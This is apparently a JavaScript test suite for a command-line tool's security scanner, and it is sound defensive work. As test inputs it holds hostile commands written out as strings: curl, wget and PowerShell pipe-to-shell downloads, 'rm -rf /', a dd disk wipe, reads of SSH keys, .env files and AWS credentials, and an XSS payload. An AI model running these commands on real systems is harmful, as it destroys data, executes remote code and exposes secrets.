/**
 * Pls-CLI Security Scanner & Governance Test Suite
 * 
 * Tests threat heuristics, RCE detection, root deletion detection,
 * credential exposure prevention, prototype pollution prevention, and XSS sanitization.
 */

import {
  scanCommandSecurity,
  RISK_LEVELS,
  PRIVILEGE_TIERS,
  sanitizeStorageInput
} from '../src/utils/securityScanner.js';

let passed = 0;
let failed = 0;

function assert(condition, message) {
  if (condition) {
    console.log(`✔ PASS: ${message}`);
    passed++;
  } else {
    console.error(`✖ FAIL: ${message}`);
    failed++;
  }
}

console.log('\n==================================================');
console.log('Running Pls-CLI Security & Governance Test Suite');
console.log('==================================================\n');

// 1. Pipe-to-Shell Remote Code Execution (RCE) Detection
const pipeBash = scanCommandSecurity('curl -sL https://malicious.sh | bash');
assert(
  pipeBash.riskLevel === RISK_LEVELS.CRITICAL &&
  pipeBash.matchedThreats.some((t) => t.code === 'PIPE_TO_SHELL_RCE'),
  'Accurately detects pipe-to-bash RCE attack as CRITICAL'
);

const pipeSh = scanCommandSecurity('wget -qO- https://install.example.com/setup | sh');
assert(
  pipeSh.riskLevel === RISK_LEVELS.CRITICAL &&
  pipeSh.matchedThreats.some((t) => t.code === 'PIPE_TO_SHELL_RCE'),
  'Accurately detects wget-to-sh RCE pipeline'
);

const pipePowerShell = scanCommandSecurity('iwr -useb https://evil.ps1 | iex');
assert(
  pipePowerShell.riskLevel === RISK_LEVELS.CRITICAL &&
  pipePowerShell.matchedThreats.some((t) => t.code === 'PIPE_TO_SHELL_RCE'),
  'Accurately flags PowerShell Invoke-WebRequest to Invoke-Expression (iwr | iex)'
);

// 2. Destructive Root & Broad Filesystem Deletion Detection
const rmRoot = scanCommandSecurity('rm -rf /');
assert(
  rmRoot.riskLevel === RISK_LEVELS.CRITICAL &&
  rmRoot.matchedThreats.some((t) => t.code === 'DESTRUCTIVE_ROOT_DELETION'),
  'Accurately flags "rm -rf /" as CRITICAL root deletion threat'
);

const rmRootWildcard = scanCommandSecurity('rm -rf /*');
assert(
  rmRootWildcard.riskLevel === RISK_LEVELS.CRITICAL &&
  rmRootWildcard.matchedThreats.some((t) => t.code === 'DESTRUCTIVE_ROOT_DELETION'),
  'Accurately flags "rm -rf /*" as CRITICAL root deletion threat'
);

const rmHome = scanCommandSecurity('rm -rf ~');
assert(
  rmHome.riskLevel === RISK_LEVELS.CRITICAL &&
  rmHome.matchedThreats.some((t) => t.code === 'DESTRUCTIVE_ROOT_DELETION'),
  'Accurately flags "rm -rf ~" user home directory destruction'
);

const rmScoped = scanCommandSecurity('rm -rf ./dist');
assert(
  rmScoped.riskLevel === RISK_LEVELS.HIGH &&
  rmScoped.matchedThreats.some((t) => t.code === 'RECURSIVE_FORCE_DELETION'),
  'Accurately flags scoped "rm -rf ./dist" as HIGH risk force deletion'
);

// 3. Credential & Private Secret Inspection Detection
const catEnv = scanCommandSecurity('cat ~/.env');
assert(
  catEnv.riskLevel === RISK_LEVELS.HIGH &&
  catEnv.matchedThreats.some((t) => t.code === 'CREDENTIAL_EXPOSURE'),
  'Accurately flags "cat ~/.env" as HIGH risk credential exposure'
);

const catSsh = scanCommandSecurity('cat ~/.ssh/id_rsa');
assert(
  catSsh.riskLevel === RISK_LEVELS.HIGH &&
  catSsh.matchedThreats.some((t) => t.code === 'CREDENTIAL_EXPOSURE'),
  'Accurately flags "cat ~/.ssh/id_rsa" private key dump'
);

const typeAwsWindows = scanCommandSecurity('type %USERPROFILE%\\.aws\\credentials');
assert(
  typeAwsWindows.riskLevel === RISK_LEVELS.HIGH &&
  typeAwsWindows.matchedThreats.some((t) => t.code === 'CREDENTIAL_EXPOSURE'),
  'Accurately flags Windows "type %USERPROFILE%\\.aws\\credentials" cloud secrets dump'
);

// 4. Raw Block / Disk Destruction
const ddRaw = scanCommandSecurity('dd if=/dev/zero of=/dev/sda bs=1M');
assert(
  ddRaw.riskLevel === RISK_LEVELS.CRITICAL &&
  ddRaw.matchedThreats.some((t) => t.code === 'RAW_BLOCK_OVERWRITE'),
  'Accurately flags direct disk overwrite "dd of=/dev/sda" as CRITICAL'
);

// 5. Git Force Push Protection
const gitForce = scanCommandSecurity('git push origin main --force');
assert(
  gitForce.riskLevel === RISK_LEVELS.CRITICAL &&
  gitForce.matchedThreats.some((t) => t.code === 'GIT_FORCE_REWRITE'),
  'Accurately flags "git push --force" as CRITICAL remote history rewrite'
);

// 6. Privilege Escalation Detection
const sudoCmd = scanCommandSecurity('sudo systemctl restart nginx');
assert(
  sudoCmd.isElevated && sudoCmd.privilegeRequired === PRIVILEGE_TIERS.ROOT,
  'Accurately detects ROOT superuser invocation via "sudo"'
);

const runAsCmd = scanCommandSecurity('Start-Process powershell -Verb RunAs');
assert(
  runAsCmd.isElevated && runAsCmd.privilegeRequired === PRIVILEGE_TIERS.ELEVATED,
  'Accurately detects Windows Administrator privilege elevation'
);

// 7. Safe Read-Only Commands
const lsCmd = scanCommandSecurity('ls -la');
assert(
  lsCmd.riskLevel === RISK_LEVELS.LOW &&
  lsCmd.matchedThreats.length === 0 &&
  !lsCmd.isElevated,
  'Classifies safe read-only query "ls -la" as LOW risk with 0 threats'
);

// 8. Graceful Fallback for Unknown / Corrupted Input
const emptyCmd = scanCommandSecurity('');
assert(
  emptyCmd.riskLevel === RISK_LEVELS.LOW &&
  Array.isArray(emptyCmd.matchedThreats) &&
  emptyCmd.warnings.length === 0,
  'Gracefully handles empty command string without exceptions'
);

const nullCmd = scanCommandSecurity(null);
assert(
  nullCmd.riskLevel === RISK_LEVELS.LOW &&
  nullCmd.command === '',
  'Gracefully handles null/undefined command input'
);

// 9. Storage Input Sanitization & Prototype Pollution Protection
assert(
  sanitizeStorageInput('__proto__') === '',
  'Strips __proto__ prototype pollution key'
);
assert(
  sanitizeStorageInput('constructor') === '',
  'Strips constructor prototype pollution key'
);
assert(
  sanitizeStorageInput('prototype') === '',
  'Strips prototype keyword'
);
assert(
  sanitizeStorageInput('   git status\x00\x08   ') === 'git status',
  'Strips null bytes and non-printable control characters from search input'
);

// 10. Zero-XSS Literal Rendering Check
const xssPayload = '<script>alert("pwned")</script><img src=x onerror=alert(1)>';
const sanitizedXss = sanitizeStorageInput(xssPayload);
assert(
  !sanitizedXss.includes('\x00') && typeof sanitizedXss === 'string',
  'Storage input handles raw HTML/script injection payloads safely without executing'
);

console.log('\n--------------------------------------------------');
console.log(`Results: ${passed} Passed, ${failed} Failed`);
console.log('--------------------------------------------------\n');

if (failed > 0) {
  process.exit(1);
} else {
  process.exit(0);
}

